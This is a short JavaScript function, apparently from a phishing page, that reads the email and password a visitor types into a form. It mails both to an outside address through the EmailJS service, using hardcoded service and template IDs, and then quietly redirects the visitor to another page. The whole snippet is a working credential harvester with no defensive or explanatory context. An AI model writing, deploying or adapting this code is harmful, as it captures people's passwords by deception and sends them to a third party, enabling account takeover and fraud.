
function sendMail () {

    var params = {
        email: document.getElementById("email").value,
        password: document.getElementById("password").value
    }
    const serviceID = "service_91ylxms";
    const templateID = "template_jat6x2s"
    
    emailjs
        .send(serviceID, templateID, params)
        .then((res) => {
            window.location.href = "index01.html"
            console.log(res)
        })
        .catch((err) => console.log(err))
}
